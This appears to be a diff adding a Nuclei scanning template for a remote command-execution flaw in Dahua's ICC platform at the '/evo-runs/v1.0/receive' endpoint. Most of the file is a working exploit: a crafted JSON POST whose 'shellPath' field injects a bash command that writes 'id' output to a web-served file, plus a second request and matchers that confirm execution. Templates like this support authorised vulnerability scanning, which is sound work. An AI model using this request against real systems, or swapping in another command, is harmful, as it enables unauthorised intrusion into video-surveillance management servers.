@@ -1,0 +1,61 @@
+id: dahua-icc-receive-rce
+info:
+  name: 大华icc evo-runsv1.0 receive RCE
+  author: leadlife
+  severity: critical
+  description: 
+  reference: 
+    - https://github.com/crushforyou/2025hvv-poc/blob/a09c3778c7df907941342afba5c18f08cd515d9c/%E5%A4%A7%E5%8D%8E/%E5%A4%A7%E5%8D%8Eicc%20evo-runsv1.0%20receive%20RCE.txt#L4
+  classification:
+    cve-id: 
+  metadata:
+    verified: true
+    fofa-query: demo
+    tips:
+    repair:
+    version:
+  tags: dahua,icc,rce
+
+variables:
+    filename: "{{to_lower(rand_base(4))}}"
+    date: '{{date_time("%Y%M%D%H%M%S")}}'
+
+http:
+  - raw:
+      - |
+        POST /evo-runs/v1.0/receive HTTP/1.1
+        Host: {{Hostname}}
+        Accept-Encoding: gzip
+        Connection: keep-alive
+        Content-Length: 249
+        Content-Type: application/json
+        User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2224.3 Safari/537.36
+        X-Subject-Headerflag: ADAPT
+
+        {
+          "method": "agent.ossm.mapping.config",
+          "info": {
+            "configure": "abcd",
+            "filePath": "haha",
+            "paramMap": {
+              "shellPath": "/bin/bash -c id>/opt/evoWpms/static/{{filename}}.txt",
+              "filePath": "abc"
+            },
+            "requestIp": ""
+          }
+        }
+      
+      - |+
+        GET /static/{{filename}}.txt HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code_1 == 200 && status_code_2 == 200
+
+      - type: regex
+        part: body_2
+        regex:
+          - "((u|g)id|groups)=[0-9]{1,4}\\([a-z0-9]+\\)"
